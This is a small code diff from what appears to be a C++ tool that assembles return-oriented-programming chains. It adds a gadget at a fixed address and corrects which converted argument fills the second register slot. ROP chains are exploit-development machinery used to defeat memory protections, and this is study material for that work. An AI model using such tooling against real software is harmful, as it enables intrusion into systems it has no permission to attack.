@@ -71,7 +71,7 @@ public:
             this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
             this->AddPadding(0x8);
             this->AddValue(ConvertedArgs[0], "FirstArg");
-            this->AddValue(ConvertedArgs[0], "SecondArg");
+            this->AddValue(ConvertedArgs[1], "SecondArg");
             this->AddPadding(0x8);
         }
 
